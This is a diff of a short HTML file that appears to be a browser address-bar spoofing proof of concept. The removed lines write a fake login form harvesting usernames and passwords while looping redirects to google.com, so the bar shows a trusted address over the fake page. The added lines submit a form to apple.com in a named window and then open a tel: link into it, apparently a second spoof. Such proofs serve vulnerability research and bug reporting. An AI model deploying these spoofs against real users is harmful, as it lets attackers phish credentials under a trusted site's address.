@@ -1,24 +1,30 @@
-
 <!DOCTYPE HTML>
-<html lang="en-US">
+<html>
+
 <head>
-	<meta charset="UTF-8">
-	<title>Omnibox spoofing</title>
-	<script>
-		window.onbeforeunload = function() {
-			document.write('<title>Fake website</title><br><br><center><h1>A fake website</h1><form method="post">Username: <input type="text" name="username" size="15"/><br/>Password: &nbsp;<input type="password" name="passwort" size="15"/><br/><div align="center"><p><input type="submit" value="Login"/></p></form></center>');
-			setInterval(function() {
-				location.href = "https://www.google.com:1234";
-			}, 0);
-		}
-	</script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
 </head>
 
 <body>
-	<center>
-		<br>
-		<h1>Access any website using the omnibox</h1>
-	</center>
+
+<form action="https://www.apple.com" target="aa" method="get" onsubmit="setTimeout('p()',1200);">
+
+<input type="submit">
+
+</form>
+
+<script>
+
+function p() {
+
+  var t = window.open('tel:10010','aa');
+
+}
+
+</script>
+
 </body>
 
 </html>
